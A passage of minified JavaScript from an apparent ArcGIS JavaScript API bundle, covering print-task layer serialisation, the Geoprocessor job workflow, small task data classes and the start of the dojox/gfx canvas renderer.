d=g.takeScreenshot(f);d.isResolved()?d.then(function(f){"data:image/png;base64,"===f.dataURL.substr(0,22)&&(b.imageData=f.dataURL.substr(22))}):console.error("PrintTask: VectorTileLayer.takeScreenshot() returned an unresolved Promise");b.imageData&&k.push(b);break;case "esri.layers.WebTiledLayer":d=g.url.replace(/\$\{/g,"{");b=n.mixin(b,{type:"WebTiledLayer",urlTemplate:d,credits:g.copyright});g.subDomains&&0<g.subDomains.length&&(b.subDomains=g.subDomains);g._wmtsInfo&&(b.wmtsInfo=g._wmtsInfo);delete b.url;
k.push(b);break;default:if(g.getTileUrl||g.getImageUrl)b=n.mixin(b,{url:g.url}),k.push(b)}r=t.map(a.graphicsLayerIds,a.getLayer,a);for(q=0;q<r.length;q++)g=r[q],g.isFeatureReductionActive&&g.isFeatureReductionActive()&&(g.getSingleGraphics().length?r.splice(++q,0,g.getFeatureReductionLayer()):r[q]=g.getFeatureReductionLayer());for(q=0;q<r.length;q++)if(g=r[q],g.loaded&&g.visible&&(!e||g.isVisibleAtScale(e)))switch(d=g.declaredClass,d){case "esri.layers.FeatureLayer":case "esri.layers.LabelLayer":case "esri.layers.CSVLayer":case "esri.layers.StreamLayer":if("esri.layers.LabelLayer"===
d&&!c.showLabels||g.renderer&&"esri.renderer.HeatmapRenderer"===g.renderer.declaredClass)continue;d=null;g.url&&g.renderer&&("esri.renderer.ScaleDependentRenderer"===g.renderer.declaredClass?"scale"===g.renderer.rangeType?d=g.renderer.getRendererInfoByScale(a.getScale())&&g.renderer.getRendererInfoByScale(a.getScale()).renderer:"zoom"===g.renderer.rangeType&&(d=g.renderer.getRendererInfoByZoom(a.getZoom())&&g.renderer.getRendererInfoByZoom(a.getZoom()).renderer):d=g.renderer);if(d&&("esri.renderer.SimpleRenderer"===
d.declaredClass||"esri.renderer.TemporalRenderer"===d.declaredClass||n.isString(d.attributeField)&&g._getField(d.attributeField,!0))&&!d.valueExpression&&!this._isFeatureCollectionRequired(d,g)&&"esri.renderer.DotDensityRenderer"!==d.declaredClass&&"esri.layers.CSVLayer"!==g.declaredClass&&"esri.layers.StreamLayer"!==g.declaredClass)if(b={id:g.id,title:n.getObject("arcgisProps.title",!1,g)||g.id,opacity:g.opacity,minScale:g.minScale||0,maxScale:g.maxScale||0,layerDefinition:{drawingInfo:{renderer:d.toJson({useLegacyRotationProperties:!0})}}},
b=n.mixin(b,this._getUrlAndToken(g)),"esri.renderer.TemporalRenderer"===d.declaredClass&&(f=b.layerDefinition.drawingInfo,f.latestObservationRenderer=f.renderer.latestObservationRenderer,f.trackLinesRenderer=f.renderer.trackRenderer,f.observationAger=f.renderer.observationAger,f.renderer=f.renderer.observationRenderer,g._trackIdField&&(b.layerDefinition.timeInfo={trackIdField:g._trackIdField})),this._convertSvgRenderer(b.layerDefinition.drawingInfo.renderer),1>g.opacity||"esri.renderer.TemporalRenderer"===
d.declaredClass||this._updateLayerOpacity(b))if(g._params.source&&(d=g._params.source.toJson(),n.mixin(b.layerDefinition,{source:d})),g.getDefinitionExpression()&&n.mixin(b.layerDefinition,{definitionExpression:g.getDefinitionExpression()}),2!==g.mode)0<g.getSelectedFeatures().length&&(d=t.map(g.getSelectedFeatures(),function(f){return f.attributes[g.objectIdField]}),0<d.length&&g.getSelectionSymbol()&&n.mixin(b,{selectionObjectIds:d,selectionSymbol:g.getSelectionSymbol().toJson()}));else{d=t.map(g.getSelectedFeatures(),
function(f){return f.attributes[g.objectIdField]});if(0===d.length||!g._params.drawMode)break;n.mixin(b.layerDefinition,{objectIds:d});d=null;g.getSelectionSymbol()&&(d=new F(g.getSelectionSymbol()));n.mixin(b.layerDefinition.drawingInfo,{renderer:d&&d.toJson()})}else b=this._createFeatureCollection(g,a);else b=d&&(d.valueExpression||this._isFeatureCollectionRequired(d,g)||"esri.renderer.DotDensityRenderer"===d.declaredClass)?this._createFeatureCollection(g,a,d):this._createFeatureCollection(g,a);
if(!b)continue;k.push(b);this.allLayerslegend&&this.allLayerslegend.push({id:g.id});break;case "esri.layers._GraphicsLayer":case "esri.layers.GraphicsLayer":case "esri.layers.WFSLayer":b=this._createFeatureCollection(g,a);if(!b)continue;k.push(b);this.allLayerslegend&&this.allLayerslegend.push({id:g.id});break;case "esri.layers.ArcGISImageServiceVectorLayer":b={id:g.id,title:n.getObject("arcgisProps.title",!1,g)||g.id,opacity:g.opacity,minScale:g.minScale||0,maxScale:g.maxScale||0,visibility:g.visible,
symbolTileSize:g.symbolTileSize,layerDefinition:{drawingInfo:{renderer:g.renderer.toJson({useLegacyRotationProperties:!0})}}},b=n.mixin(b,this._getUrlAndToken(g)),g.mosaicRule&&n.mixin(b,{mosaicRule:g.mosaicRule.toJson()}),k.push(b),this.allLayerslegend&&this.allLayerslegend.push({id:g.id})}e&&t.forEach(k,function(f){f.minScale=0;f.maxScale=0});a.graphics&&0<a.graphics.graphics.length&&(b=this._createFeatureCollection(a.graphics,a))&&k.push(b);a._labels&&c.showLabels&&(b=this._createFeatureCollection(a._labels,
a))&&k.push(b);t.forEach(k,function(f,a,m){f._isRefLayer&&(delete f._isRefLayer,m.splice(a,1),m.push(f))});return k},_getUrlAndToken:function(a){return{token:a._getToken(),url:a._url?a._url.path:null}},_updateLayerOpacity:function(a){var c=this._colorEvaluator(a),c=t.filter(c,function(a){return n.isArray(a)&&4===a.length}),d=!0;if(c.length){var g=c[0][3],b;for(b=1;b<c.length;b++)if(g!==c[b][3]){d=!1;break}if(d)for(a.opacity=g/255,b=0;b<c.length;b++)c[b][3]=255}return d},_isFeatureCollectionRequired:function(a,
c){if(c&&c.isFeatureReductionActive&&c.isFeatureReductionActive())return!0;var b=!1;if(c=this._getVariable(a,"rotationInfo",!1))b=(b=c.field)&&n.isFunction(b)||c.valueExpression;return a.hasVisualVariables("sizeInfo")||a.hasVisualVariables("colorInfo")||a.hasVisualVariables("opacityInfo")||b},_getVariable:function(a,c,b){var d;a&&(d=(a=a.getVisualVariablesForType(c,b))&&a[0]);return d},_applyVisualVariables:function(a,c){var b=c.renderer,d=c.graphic,h=c.symbol,l=c.mapResolution,q=c.mapScale,k=h.type;
if("textsymbol"!==k&&"shieldlabelsymbol"!==k){var e=this._getVariable(b,"sizeInfo",!1),r=this._getVariable(b,"colorInfo",!1),f=this._getVariable(b,"opacityInfo",!1);c=this._getVariable(b,"rotationInfo",!1);h instanceof D&&(e=this._getVariable(b,"sizeInfo","outline")||e);l=e?b.getSize(d,{sizeInfo:e,shape:"simplemarkersymbol"===k?h.style:null,resolution:l,scale:q}):d.size;null!=l&&("simplemarkersymbol"===k?a.size=B.px2pt(l):"picturemarkersymbol"===k?(q=h.width/h.height*l,a.width=B.px2pt(q),a.height=
B.px2pt(l),0!==h.xoffset&&(a.xoffset=B.px2pt(h.xoffset/h.width*q)),0!==h.yoffset&&(a.yoffset=B.px2pt(h.yoffset/h.height*l))):"simplelinesymbol"===k?a.width=B.px2pt(l):a.outline&&(a.outline.width=B.px2pt(l)));r&&(!(h=b.getColor(d,{colorInfo:r}))||"simplemarkersymbol"!==k&&"simplelinesymbol"!==k&&"simplefillsymbol"!==k||(a.color=w.toJsonColor(h)));f&&(h=b.getOpacity(d,{opacityInfo:f}),null!=h&&a.color&&(a.color[3]=Math.round(255*h)));c&&(b=b.getRotationAngle(d,{rotationInfo:c}))&&(a.angle=-b)}}});r("extend-esri")&&
n.setObject("tasks.PrintTask",e,d);return e})},"esri/tasks/Geoprocessor":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/Deferred dojo/_base/json dojo/has dojo/io-query ../kernel ../request ../deferredUtils ../geometry/normalizeUtils ./Task ./FeatureSet ./JobInfo ./GPMessage ./LinearUnit ./DataFile ./RasterData ./Date ./ParameterValue ./GPResultImageLayer ../layers/ArcGISDynamicMapServiceLayer ../layers/MapImage".split(" "),function(e,n,t,u,x,r,d,b,h,c,w,l,k,a,F,
D,z,y,G,A,B,J,I){e=e(l,{declaredClass:"esri.tasks.Geoprocessor",_eventMap:{"execute-complete":["results","messages"],"get-result-data-complete":["result"],"get-result-image-complete":["mapImage"],"get-result-image-layer-complete":["layer"],"job-cancel":["jobInfo"],"job-complete":["jobInfo"],"status-update":["jobInfo"]},constructor:function(a){this._jobUpdateHandler=n.hitch(this,this._jobUpdateHandler);this._getJobStatus=n.hitch(this,this._getJobStatus);this._getResultDataHandler=n.hitch(this,this._getResultDataHandler);
this._getResultImageHandler=n.hitch(this,this._getResultImageHandler);this._executeHandler=n.hitch(this,this._executeHandler);this._updateTimers=[];this.registerConnectEvents()},updateDelay:1E3,processSpatialReference:null,outputSpatialReference:null,outSpatialReference:null,setUpdateDelay:function(a){this.updateDelay=a},setProcessSpatialReference:function(a){this.processSpatialReference=a},setOutputSpatialReference:function(a){this._setOutSR(a)},setOutSpatialReference:function(a){this._setOutSR(a)},
__msigns:[{n:"execute",c:3,a:[{i:0,p:["*"]}],e:2,f:1},{n:"submitJob",c:4,a:[{i:0,p:["*"]}],e:3}],_setOutSR:function(a){this.outSpatialReference=this.outputSpatialReference=a},_getOutSR:function(){return this.outSpatialReference||this.outputSpatialReference},_gpEncode:function(a,c,b){for(var d in a){var h=a[d];n.isArray(h)?a[d]=x.toJson(t.map(h,function(a){return this._gpEncode({item:a},!0).item},this)):h instanceof Date&&(a[d]=h.getTime())}return this._encode(a,c,b)},_decode:function(a){var c=a.dataType,
b=new A(a);if(-1!==t.indexOf(["GPBoolean","GPDouble","GPLong","GPString"],c))return b;if("GPLinearUnit"===c)b.value=new D(b.value);else if("GPFeatureRecordSetLayer"===c||"GPRecordSet"===c)b.value=new k(b.value);else if("GPDataFile"===c)b.value=new z(b.value);else if("GPDate"===c)a=b.value,n.isString(a)?b.value=new G({date:a}):b.value=new Date(a);else if("GPRasterData"===c||"GPRasterDataLayer"===c)a=a.value.mapImage,b.value=a?new I(a):new y(b.value);else if(-1!==c.indexOf("GPMultiValue:")){var d=c.split(":")[1];
a=b.value;b.value=t.map(a,function(a){return this._decode({paramName:"_name",dataType:d,value:a}).value},this)}else console.log(this.declaredClass+" : GP Data type not handled. : "+b.dataType),b=null;return b},submitJob:function(a,c,b,d,l){var g=this._getOutSR(),k=l.assembly;a=this._gpEncode(n.mixin({},this._url.query,{f:"json","env:outSR":g?g.wkid||x.toJson(g.toJson()):null,"env:processSR":this.processSpatialReference?this.processSpatialReference.wkid||x.toJson(this.processSpatialReference.toJson()):
null},a),null,k&&k[0]);var e=this._jobUpdateHandler,q=this._errorHandler;return h({url:this._url.path+"/submitJob",content:a,callbackParamName:"callback",load:function(a,f){e(a,f,!1,c,b,l.dfd)},error:function(a){q(a,d,l.dfd)}})},_jobUpdateHandler:function(c,b,d,h,l,k){var g=c.jobId;b=new a(c);this._successHandler([b],"onStatusUpdate",l,d&&k);if(!d)switch(clearTimeout(this._updateTimers[g]),this._updateTimers[g]=null,k&&k.progress(b),c.jobStatus){case a.STATUS_SUBMITTED:case a.STATUS_EXECUTING:case a.STATUS_WAITING:case a.STATUS_NEW:var e=
this._getJobStatus;this._updateTimers[g]=setTimeout(function(){e(g,d,h,l,k)},this.updateDelay);break;default:this._successHandler([b],"onJobComplete",h,k)}},_getJobStatus:function(a,c,b,d,l){var g=this._jobUpdateHandler;h({url:this._url.path+"/jobs/"+a,content:n.mixin({},this._url.query,{f:"json"}),callbackParamName:"callback",load:function(a,h){g(a,h,c,b,d,l)},error:this._errorHandler})},_getResultDataHandler:function(a,c,b,d,h){try{var g=this._decode(a);this._successHandler([g],"onGetResultDataComplete",
b,h)}catch(H){this._errorHandler(H,d,h)}},getResultData:function(a,b,d,g){var l=this._getResultDataHandler,k=this._errorHandler,e=new u(c._dfdCanceller);e._pendingDfd=h({url:this._url.path+"/jobs/"+a+"/results/"+b,content:n.mixin({},this._url.query,{f:"json",returnType:"data"}),callbackParamName:"callback",load:function(a,c){l(a,c,d,g,e)},error:function(a){k(a,g,e)}});return e},checkJobStatus:function(a,b,d){var g=this._jobUpdateHandler,l=this._errorHandler,k=new u(c._dfdCanceller);k._pendingDfd=
h({url:this._url.path+"/jobs/"+a,content:n.mixin({},this._url.query,{f:"json"}),callbackParamName:"callback",load:function(a,c){g(a,c,!0,null,b,k)},error:function(a){l(a,d,k)}});return k},cancelJob:function(a,b,d){var g=this._errorHandler,l=new u(c._dfdCanceller);l._pendingDfd=h({url:this._url.path+"/jobs/"+a+"/cancel",content:n.mixin({},this._url.query,{f:"json"}),callbackParamName:"callback",load:n.hitch(this,function(a,c){this._successHandler([a],"onJobCancel",b,l)}),error:function(a){g(a,d,l)}});
return l},execute:function(a,c,b,d){var g=this._getOutSR(),l=d.assembly;a=this._gpEncode(n.mixin({},this._url.query,{f:"json","env:outSR":g?g.wkid||x.toJson(g.toJson()):null,"env:processSR":this.processSpatialReference?this.processSpatialReference.wkid||x.toJson(this.processSpatialReference.toJson()):null},a),null,l&&l[0]);var k=this._executeHandler,e=this._errorHandler;return h({url:this._url.path+"/execute",content:a,callbackParamName:"callback",load:function(a,h){k(a,h,c,b,d.dfd)},error:function(a){e(a,
b,d.dfd)}})},_executeHandler:function(a,c,b,d,h){try{var g=a.results,l,k,e=a.messages;l=0;for(k=g.length;l<k;l++)g[l]=this._decode(g[l]);l=0;for(k=e.length;l<k;l++)e[l]=new F(e[l]);this._successHandler([g,e],"onExecuteComplete",b,h)}catch(L){this._errorHandler(L,d,h)}},_getResultImageHandler:function(a,c,b,d,h){try{var g=this._decode(a);this._successHandler([g],"onGetResultImageComplete",b,h)}catch(H){this._errorHandler(H,d,h)}},getResultImage:function(a,b,d,g,l){var k=this._getResultImageHandler,
e=this._errorHandler;d=this._gpEncode(n.mixin({},this._url.query,{f:"json"},d.toJson()));var r=new u(c._dfdCanceller);r._pendingDfd=h({url:this._url.path+"/jobs/"+a+"/results/"+b,content:d,callbackParamName:"callback",load:function(a,c){k(a,c,g,l,r)},error:function(a){e(a,l,r)}});return r},cancelJobStatusUpdates:function(a){clearTimeout(this._updateTimers[a]);this._updateTimers[a]=null},getResultImageLayer:function(a,c,b,h){if(null==c){var l=this._url.path.indexOf("/GPServer/");a=this._url.path.substring(0,
l)+"/MapServer/jobs/"+a}else a=this._url.path+"/jobs/"+a+"/results/"+c;this._url.query&&(a+="?"+d.objectToQuery(this._url.query));c=null==c?new J(a,{imageParameters:b}):new B(a,{imageParameters:b},!0);this.onGetResultImageLayerComplete(c);h&&h(c);return c},onStatusUpdate:function(){},onJobComplete:function(){},onExecuteComplete:function(){},onGetResultDataComplete:function(){},onGetResultImageComplete:function(){},onGetResultImageLayerComplete:function(){},onJobCancel:function(){}});w._createWrappers(e);
r("extend-esri")&&n.setObject("tasks.Geoprocessor",e,b);return e})},"esri/tasks/JobInfo":function(){define(["dojo/_base/declare","dojo/_base/lang","dojo/has","../kernel","./GPMessage"],function(e,n,t,u,x){e=e(null,{declaredClass:"esri.tasks.JobInfo",constructor:function(e){this.messages=[];n.mixin(this,e);e=this.messages;var d,b=e.length;for(d=0;d<b;d++)e[d]=new x(e[d])},jobId:"",jobStatus:""});n.mixin(e,{STATUS_CANCELLED:"esriJobCancelled",STATUS_CANCELLING:"esriJobCancelling",STATUS_DELETED:"esriJobDeleted",
STATUS_DELETING:"esriJobDeleting",STATUS_EXECUTING:"esriJobExecuting",STATUS_FAILED:"esriJobFailed",STATUS_NEW:"esriJobNew",STATUS_SUBMITTED:"esriJobSubmitted",STATUS_SUCCEEDED:"esriJobSucceeded",STATUS_TIMED_OUT:"esriJobTimedOut",STATUS_WAITING:"esriJobWaiting"});t("extend-esri")&&n.setObject("tasks.JobInfo",e,u);return e})},"esri/tasks/GPMessage":function(){define(["dojo/_base/declare","dojo/_base/lang","dojo/has","../kernel"],function(e,n,t,u){e=e(null,{declaredClass:"esri.tasks.GPMessage",constructor:function(e){n.mixin(this,
e)}});n.mixin(e,{TYPE_INFORMATIVE:"esriJobMessageTypeInformative",TYPE_PROCESS_DEFINITION:"esriJobMessageTypeProcessDefinition",TYPE_PROCESS_START:"esriJobMessageTypeProcessStart",TYPE_PROCESS_STOP:"esriJobMessageTypeProcessStop",TYPE_WARNING:"esriJobMessageTypeWarning",TYPE_ERROR:"esriJobMessageTypeError",TYPE_EMPTY:"esriJobMessageTypeEmpty",TYPE_ABORT:"esriJobMessageTypeAbort"});t("extend-esri")&&n.setObject("tasks.GPMessage",e,u);return e})},"esri/tasks/LinearUnit":function(){define(["dojo/_base/declare",
"dojo/_base/lang","dojo/has","../kernel"],function(e,n,t,u){e=e(null,{declaredClass:"esri.tasks.LinearUnit",constructor:function(e){e&&n.mixin(this,e)},distance:0,units:null,toJson:function(){var e={};this.distance&&(e.distance=this.distance);this.units&&(e.units=this.units);return e}});t("extend-esri")&&n.setObject("tasks.LinearUnit",e,u);return e})},"esri/tasks/DataFile":function(){define(["dojo/_base/declare","dojo/_base/lang","dojo/has","../kernel"],function(e,n,t,u){e=e(null,{declaredClass:"esri.tasks.DataFile",
constructor:function(e){e&&n.mixin(this,e)},url:null,itemID:null,toJson:function(){var e={};this.url&&(e.url=this.url);this.itemID&&(e.itemID=this.itemID);return e}});t("extend-esri")&&n.setObject("tasks.DataFile",e,u);return e})},"esri/tasks/RasterData":function(){define(["dojo/_base/declare","dojo/_base/lang","dojo/has","../kernel"],function(e,n,t,u){e=e(null,{declaredClass:"esri.tasks.RasterData",constructor:function(e){e&&n.mixin(this,e)},url:null,format:null,itemID:null,toJson:function(){var e=
{};this.url&&(e.url=this.url);this.format&&(e.format=this.format);this.itemID&&(e.itemID=this.itemID);return e}});t("extend-esri")&&n.setObject("tasks.RasterData",e,u);return e})},"esri/tasks/Date":function(){define(["dojo/_base/declare","dojo/_base/lang","dojo/date/locale","dojo/has","../kernel"],function(e,n,t,u,x){e=e(null,{declaredClass:"esri.tasks.Date",constructor:function(e){e&&(e.format&&(this.format=e.format),this.date=t.parse(e.date,{selector:"date",datePattern:this.format}))},date:new Date,
format:"EEE MMM dd HH:mm:ss zzz yyyy",toJson:function(){return{date:t.format(this.date,{selector:"date",datePattern:this.format}),format:this.format}}});u("extend-esri")&&n.setObject("tasks.Date",e,x);return e})},"esri/tasks/ParameterValue":function(){define(["dojo/_base/declare","dojo/_base/lang","dojo/has","../kernel"],function(e,n,t,u){e=e(null,{declaredClass:"esri.tasks.ParameterValue",constructor:function(e){n.mixin(this,e)}});t("extend-esri")&&n.setObject("tasks.ParameterValue",e,u);return e})},
"esri/tasks/GPResultImageLayer":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/json dojo/has dojo/io-query ../kernel ../layers/ArcGISDynamicMapServiceLayer".split(" "),function(e,n,t,u,x,r,d){e=e(d,{declaredClass:"esri.tasks._GPResultImageLayer",constructor:function(b,d){d&&d.imageParameters&&d.imageParameters.extent&&(this.initialExtent=this.fullExtent=d.imageParameters.extent,this.spatialReference=this.initialExtent.spatialReference);this.getImageUrl=n.hitch(this,this.getImageUrl);
this.loaded=!0;this.onLoad(this)},getImageUrl:function(b,d,c,e){var h=b.spatialReference.wkid;e(this._url.path+"?"+x.objectToQuery(n.mixin(this._params,{f:"image",bbox:t.toJson(b.toJson()),bboxSR:h,imageSR:h,size:d+","+c})))}});u("extend-esri")&&n.setObject("tasks._GPResultImageLayer",e,r);return e})},"esri/tasks/PrintTemplate":function(){define(["dojo/_base/declare","dojo/_base/lang","dojo/has","../kernel"],function(e,n,t,u){e=e(null,{declaredClass:"esri.tasks.PrintTemplate",label:null,exportOptions:{width:800,
height:1100,dpi:96},layoutOptions:null,format:"PNG32",layout:"MAP_ONLY",outScale:0,preserveScale:!0,showAttribution:null,showLabels:!0});t("extend-esri")&&n.setObject("tasks.PrintTemplate",e,u);return e})},"dojox/gfx/canvas":function(){define("./_base dojo/_base/lang dojo/_base/array dojo/_base/declare dojo/_base/window dojo/dom-geometry dojo/dom ./shape ./path ./arc ./matrix ./decompose ./bezierutils".split(" "),function(e,n,t,u,x,r,d,b,h,c,w,l,k){function a(a,m,v,c,b,d,h,l,g,e){var f,k,E=m.length,
r=0;e?(k=e.l/b,r=e.i):k=m[0]/b;for(;d<h;)d+k>h&&(f={l:(d+k-h)*b,i:r},k=h-d),r%2||(a.beginPath(),a.arc(v,c,b,d,d+k,l),g&&a.stroke()),d+=k,++r,k=m[r%E]/b;return f}function F(a,m,v,c){var f=0,b=0,d,h=0;c?(d=c.l,h=c.i):d=m[0];for(;1>b;)b=k.tAtLength(a,d),1==b&&(f=k.computeLength(a),f={l:d-f,i:h}),a=k.splitBezierAtT(a,b),h%2||v.push(a[0]),a=a[1],++h,d=m[h%m.length];return f}function D(a,m,v,c){var f=[m.last.x,m.last.y].concat(v),b=!(a instanceof Array);v=4===v.length?"quadraticCurveTo":"bezierCurveTo";
var d=[];m=F(f,m.canvasDash,d,c);for(c=0;c<d.length;++c)f=d[c],b?(a.moveTo(f[0],f[1]),a[v].apply(a,f.slice(2))):(a.push("moveTo",[f[0],f[1]]),a.push(v,f.slice(2)));return m}function z(a,m,v,c,b,d,h){var f=0,l=0,g=0,e=k.distance(v,c,b,d),r=0;m=m.canvasDash;var E=v,q=c,w,F=!(a instanceof Array);h?(g=h.l,r=h.i):g+=m[0];for(;.01<Math.abs(1-l);)g>e&&(f={l:g-e,i:r},g=e),l=g/e,h=v+(b-v)*l,w=c+(d-c)*l,r++%2||(F?(a.moveTo(E,q),a.lineTo(h,w)):(a.push("moveTo",[E,q]),a.push("lineTo",[h,w]))),E=h,q=w,g+=m[r%
m.length];return f}var y=e.canvas={},G=null,A=w.multiplyPoint,B=Math.PI,J=2*B,I=B/2;l=n.extend;if(x.global.CanvasRenderingContext2D){x=x.doc.createElement("canvas").getContext("2d");var q="function"==typeof x.setLineDash,M="function"==typeof x.fillText}var P={solid:"none",shortdash:[4,1],shortdot:[1,1],shortdashdot:[4,1,1,1],shortdashdotdot:[4,1,1,1,1,1],dot:[1,3],dash:[4,3],longdash:[8,3],dashdot:[4,3,1,3],longdashdot:[8,3,1,3],longdashdotdot:[8,3,1,3,1,3]};y.Shape=u("dojox.gfx.canvas.Shape",b.Shape,
{_render:function(a){a.save();this._renderTransform(a);this._renderClip(a);this._renderShape(a);this._renderFill(a,!0);this._renderStroke(a,!0);a.restore()},_renderClip:function(a){this.canvasClip&&(this.canvasClip.render(a),a.clip())},_renderTransform:function(a){if("canvasTransform"in this){var f=this.canvasTransform;a.translate(f.dx,f.dy);a.rotate(f.angle2);a.scale(f.sx,f.sy);a.rotate(f.angle1)}},_renderShape:function(a){},_renderFill:function(a,m){if("canvasFill"in this){var f=this.fillStyle;
if("canvasFillImage"in this){var c=f.width,b=f.height,d=this.canvasFillImage.width,h=this.canvasFillImage.height,g=Math.min(c==d?1:c/d,b==h?1:b/h),l=(c-g*d)/2,e=(b-g*h)/2;G.width=c;G.height=b;var k=G.getContext("2d");k.clearRect(0,0,c,b);k.drawImage(this.canvasFillImage,0,0,d,h,l,e,g*d,g*h);this.canvasFill=a.createPattern(G,"repeat");delete this.canvasFillImage}a.fillStyle=this.canvasFill;m&&("pattern"!==f.type||0===f.x&&0===f.y||a.translate(f.x,f.y),a.fill())}else a.fillStyle="rgba(0,0,0,0.0)"},
_renderStroke:function(a,m){var f=this.strokeStyle;f?(a.strokeStyle=f.color.toString(),a.lineWidth=f.width,a.lineCap=f.cap,"number"==typeof f.join?(a.lineJoin="miter",a.miterLimit=f.join):a.lineJoin=f.join,this.canvasDash?q?(a.setLineDash(this.canvasDash),m&&a.stroke()):this._renderDashedStroke(a,m):m&&a.stroke()):m||(a.strokeStyle="rgba(0,0,0,0.0)")},_renderDashedStroke:function(a,m){},getEventSource:function(){return null},on:function(){},connect:function(){},disconnect:function(){},canvasClip:null,
setClip:function(a){this.inherited(arguments);var f=a?"width"in a?"rect":"cx"in a?"ellipse":"points"in a?"polyline":"d"in a?"path":null:null;if(a&&!f)return this;this.canvasClip=a?g(f,a):null;this.parent&&this.parent._makeDirty();return this}});var g=function(a,m){switch(a){case "ellipse":return{canvasEllipse:O({shape:m}),render:function(a){return y.Ellipse.prototype._renderShape.call(this,a)}};case "rect":return{shape:n.delegate(m,{r:0}),render:function(a){return y.Rect.prototype._renderShape.call(this,
a)}};case "path":return{canvasPath:K(m),render:function(a){this.canvasPath._renderShape(a)}};case "polyline":return{canvasPolyline:m.points,render:function(a){return y.Polyline.prototype._renderShape.call(this,a)}}}return null},K=function(a){var f=new dojox.gfx.canvas.Path;f.canvasPath=[];f._setPath(a.d);return f},C=function(a,m,c){var f=a.prototype[m];a.prototype[m]=c?function(){this.parent&&this.parent._makeDirty();f.apply(this,arguments);c.call(this);return this}:function(){this.parent&&this.parent._makeDirty();
return f.apply(this,arguments)}};C(y.Shape,"setTransform",function(){this.matrix?this.canvasTransform=e.decompose(this.matrix):delete this.canvasTransform});C(y.Shape,"setFill",function(){var a=this.fillStyle,m;if(a){if("object"==typeof a&&"type"in a){var c=this.surface.rawNode.getContext("2d");switch(a.type){case "linear":case "radial":m="linear"==a.type?c.createLinearGradient(a.x1,a.y1,a.x2,a.y2):c.createRadialGradient(a.cx,a.cy,0,a.cx,a.cy,a.r);t.forEach(a.colors,function(a){m.addColorStop(a.offset,
e.normalizeColor(a.color).toString())});break;case "pattern":G||(G=document.createElement("canvas")),c=new Image,this.surface.downloadImage(c,a.src),this.canvasFillImage=c}}else m=a.toString();this.canvasFill=m}else delete this.canvasFill});C(y.Shape,"setStroke",function(){var a=this.strokeStyle;if(a){var m=this.strokeStyle.style.toLowerCase();m in P&&(m=P[m]);if(m instanceof Array){this.canvasDash=m=m.slice();var c;for(c=0;c<m.length;++c)m[c]*=a.width;if("butt"!=a.cap){for(c=0;c<m.length;c+=2)m[c]-=
a.width,1>m[c]&&(m[c]=1);for(c=1;c<m.length;c+=2)m[c]+=a.width}}else delete this.canvasDash}else delete this.canvasDash;this._needsDash=!q&&!!this.canvasDash});C(y.Shape,"setShape");y.Group=u("dojox.gfx.canvas.Group",y.Shape,{constructor:function(){b.Container._init.call(this)},_render:function(a){a.save();this._renderTransform(a);this._renderClip(a);for(var f=0;f<this.children.length;++f)this.children[f]._render(a);a.restore()},destroy:function(){b.Container.clear.call(this,!0);y.Shape.prototype.destroy.apply(this,
arguments)}});y.Rect=u("dojox.gfx.canvas.Rect",[y.Shape,b.Rect],{_renderShape:function(a){var f=this.shape,c=Math.min(f.r,f.height/2,f.width/2),b=f.x,d=b+f.width,h=f.y,f=h+f.height,g=b+c,l=d-c,e=h+c,k=f-c;a.beginPath();a.moveTo(g,h);c?(a.arc(l,e,c,-I,0,!1),a.arc(l,k,c,0,I,!1),a.arc(g,k,c,I,B,!1),a.arc(g,e,c,B,B+I,!1)):(a.lineTo(l,h),a.lineTo(d,k),a.lineTo(g,f),a.lineTo(b,e));a.closePath()},_renderDashedStroke:function(f,c){var m=this.shape,b=Math.min(m.r,m.height/2,m.width/2),d=m.x,h=d+m.width,g=
m.y,l=g+m.height,e=d+b,k=h-b,r=g+b,q=l-b;b?(f.beginPath(),m=z(f,this,e,g,k,g),c&&f.stroke(),m=a(f,this.canvasDash,k,r,b,-I,0,!1,c,m),f.beginPath(),m=z(f,this,h,r,h,q,m),c&&f.stroke(),m=a(f,this.canvasDash,k,q,b,0,I,!1,c,m),f.beginPath(),m=z(f,this,k,l,e,l,m),c&&f.stroke(),m=a(f,this.canvasDash,e,q,b,I,B,!1,c,m),f.beginPath(),m=z(f,this,d,q,d,r,m),c&&f.stroke(),a(f,this.canvasDash,e,r,b,B,B+I,!1,c,m)):(f.beginPath(),m=z(f,this,e,g,k,g),m=z(f,this,k,g,h,q,m),m=z(f,this,h,q,e,l,m),z(f,this,e,l,d,r,m),
c&&f.stroke())}});var H=[];(function(){var a=c.curvePI4;H.push(a.s,a.c1,a.c2,a.e);for(var m=45;360>m;m+=45){var b=w.rotateg(m);H.push(A(b,a.c1),A(b,a.c2),A(b,a.e))}})();var O=function(a){var f,c,b,d=[],h=a.shape,g=w.normalize([w.translate(h.cx,h.cy),w.scale(h.rx,h.ry)]);f=A(g,H[0]);d.push([f.x,f.y]);for(h=1;h<H.length;h+=3)c=A(g,H[h]),b=A(g,H[h+1]),f=A(g,H[h+2]),d.push([c.x,c.y,b.x,b.y,f.x,f.y]);if(a._needsDash){f=[];c=d[0];for(h=1;h<d.length;++h)b=[],F(c.concat(d[h]),a.canvasDash,b),c=[d[h][4],d[h][5]],
f.push(b);a._dashedPoints=f}return d};y.Ellipse=u("dojox.gfx.canvas.Ellipse",[y.Shape,b.Ellipse],{setShape:function(){this.inherited(arguments);this.canvasEllipse=O(this);return this},setStroke:function(){this.inherited(arguments);q||(this.canvasEllipse=O(this));return this},_renderShape:function(a){var f=this.canvasEllipse,c;a.beginPath();a.moveTo.apply(a,f[0]);for(c=1;c<f.length;++c)a.bezierCurveTo.apply(a,f[c]);a.closePath()},_renderDashedStroke:function(a,c){var f=this._dashedPoints;a.beginPath();
for(var m=0;m<f.length;++m)for(var b=f[m],d=0;d<b.length;++d){var h=b[d];a.moveTo(h[0],h[1]);a.bezierCurveTo(h[2],h[3],h[4],h[5],h[6],h[7])}c&&a.stroke()}});y.Circle=u("dojox.gfx.canvas.Circle",[y.Shape,b.Circle],{_renderShape:function(a){var f=this.shape;a.beginPath();a.arc(f.cx,f.cy,f.r,0,J,1)},_renderDashedStroke:function(a,c){var f=this.shape,b=0,m,d=this.canvasDash.length;for(i=0;b<J;)m=this.canvasDash[i%d]/f.r,i%2||(a.beginPath(),a.arc(f.cx,f.cy,f.r,b,b+m,0),c&&a.stroke()),b+=m,++i}});y.Line=
